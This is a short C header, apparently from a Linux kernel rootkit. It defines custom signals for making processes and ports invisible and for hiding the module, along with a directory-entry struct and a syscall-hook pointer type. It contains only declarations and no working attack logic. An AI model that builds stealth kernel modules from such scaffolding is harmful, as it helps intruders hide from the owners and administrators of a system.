#ifndef OSCW_DEF_H_
#define OSCW_DEF_H_

#include <linux/syscalls.h>
#include <linux/signal.h>

enum {
    SIGINVISPROC = SIGUSR1, // 10
    SIGINVISPORT = SIGUSR2, // 12
    SIGMODHIDE   = SIGRTMIN // 32
};

struct linux_dirent {
    unsigned long	d_ino;
    unsigned long	d_off;
    unsigned short	d_reclen;
    char		    d_name[1];
};

typedef asmlinkage long (*syscall_t)(const struct pt_regs *);

#endif // OSCW_DEF_H_
